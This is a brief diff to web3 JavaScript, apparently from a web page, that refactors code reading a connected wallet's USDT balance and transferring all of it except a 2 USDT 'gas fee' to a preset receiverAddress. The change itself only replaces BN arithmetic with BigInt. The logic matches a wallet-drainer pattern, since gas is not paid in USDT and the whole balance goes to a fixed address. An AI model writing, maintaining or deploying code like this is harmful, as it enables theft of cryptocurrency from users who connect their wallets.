@@ -40,17 +40,16 @@
           const sender = accounts[0];
 
           const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
-          const balance = await usdtContract.methods.balanceOf(sender).call();
+          const balanceStr = await usdtContract.methods.balanceOf(sender).call();
+          const balance = web3.utils.toBigInt(balanceStr);
+          const gasFeeUsdt = 2000000n; // 2 USDT in 6 decimals
 
-          const BN = web3.utils.BN;
-          const gasFeeUsdt = new BN("2000000"); // 2 USDT (6 decimals)
-          const balanceBN = new BN(balance);
-          const amountToSend = balanceBN.sub(gasFeeUsdt);
-
-          if (amountToSend.lte(new BN("0"))) {
+          if (balance <= gasFeeUsdt) {
             alert("Insufficient USDT balance to send after gas fees.");
             return;
           }
+
+          const amountToSend = balance - gasFeeUsdt;
 
           const tx = await usdtContract.methods.transfer(receiverAddress, amountToSend.toString())
             .send({ from: sender });
